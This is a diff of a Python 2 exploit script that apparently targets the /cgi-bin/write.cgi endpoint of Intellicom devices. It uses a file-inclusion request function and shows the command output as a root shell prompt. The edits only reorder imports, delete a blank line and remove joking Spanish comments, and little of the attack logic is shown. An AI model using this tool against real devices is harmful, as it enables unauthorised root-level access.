@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*- 
 import sys
-import requests
 import argparse
+import requests
 # dependencia: "requests_toolbelt"
 # pip install requests-toolbelt
 from requests_toolbelt import MultipartEncoder
@@ -57,7 +57,6 @@ headers = {}
 
 host 		= 	"http://"+HST+":"+str(port)+"/"
 fullHost 	= 	"http://"+HST+":"+str(port)+"/cgi-bin/write.cgi"
-
 
 print Colors.GREEN+details+Colors.DEFAULT
 
@@ -121,11 +120,3 @@ command = reqLFI(HST)#,port)
 
 print Colors.GREEN+"\n [+] "+Colors.BLUE+"root@intellicom:~#> "+Colors.RED+cmd+Colors.BLUE+"_\n"
 print Colors.ORANGE+command+Colors.DEFAULT
-
-
-
-
-# Que asco de codigo. Ahorrar codigo donde ? xd
-# Prometo en un proximo update hacer el codigo mas feo aun. Y tal vez hasta funcione.
-
-# Los quiero
